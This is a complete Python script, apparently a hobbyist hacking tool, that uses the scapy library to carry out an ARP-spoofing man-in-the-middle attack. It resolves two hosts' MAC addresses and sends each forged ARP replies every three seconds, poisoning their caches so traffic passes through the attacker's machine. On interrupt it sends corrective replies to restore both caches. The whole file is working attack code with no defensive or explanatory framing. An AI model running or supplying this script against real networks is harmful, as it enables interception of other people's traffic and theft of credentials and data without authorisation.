import scapy.all as scapy
import time
import optparse
def getmac(ip):
    arp= scapy.ARP(pdst=ip)
    broadcast= scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    mix = broadcast/arp
    answered = scapy.srp(mix,timeout=1,verbose=False)[0]
    return answered[0][1].hwsrc
def options():
    opt = optparse.OptionParser()
    opt.add_option("-i","--ip",dest="ipadress",help="enter source ip")
    opt.add_option("-d","--di",dest="destip",help="enter destination ip adress")
    (value,key) = opt.parse_args()
    return value
def Mitm(first,second):
    dsthw = getmac(first)
    response = scapy.ARP(op=2,pdst=first,psrc=second,hwdst=dsthw)
    scapy.send(response,verbose=False)
def reset(first,second):
    dsthw = getmac(first)
    srchw = getmac(second)
    reset = scapy.ARP(op=2,pdst=first,psrc=second,hwdst=dsthw,hwsrc=srchw)
    scapy.send(reset,verbose=False)

temp =options()
try:
    while 1==1:
        Mitm(temp.ipadress,temp.destip)
        Mitm(temp.destip,temp.ipadress)
        print("Sent")
        time.sleep(3)
except KeyboardInterrupt:
    print("End.")
    reset(temp.ipadress, temp.destip)
    reset(temp.destip, temp.ipadress)





